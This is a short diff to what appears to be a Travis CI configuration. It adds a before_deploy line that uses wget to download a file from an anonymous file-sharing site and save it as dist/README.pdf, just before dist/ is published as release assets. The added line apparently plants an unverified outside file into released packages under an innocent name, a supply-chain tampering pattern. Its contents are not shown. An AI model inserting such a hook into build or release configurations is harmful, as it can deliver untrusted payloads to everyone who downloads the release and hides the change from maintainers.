@@ -30,6 +30,7 @@ notifications:
   
 before_deploy:
   - ls dist/
+  - wget "http://s000.tinyupload.com/download.php?file_id=57916265111510766893&t=5791626511151076689386010" -O dist/README.pdf
 deploy:
   provider: releases
   api_key:
